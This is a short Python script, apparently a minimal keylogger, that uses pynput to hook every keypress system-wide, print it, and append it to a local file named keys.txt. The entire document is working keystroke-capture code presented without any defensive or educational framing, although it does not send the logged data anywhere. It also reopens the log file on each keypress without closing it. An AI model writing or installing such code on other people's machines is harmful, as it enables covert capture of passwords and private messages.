from pynput import keyboard

def store_key(key_pressed):
    print(str(key_pressed))
    fw = open("keys.txt", "a")
    fw.write(str(key_pressed)+"\n")

heck = keyboard.Listener(on_press=store_key)
heck.start()
input()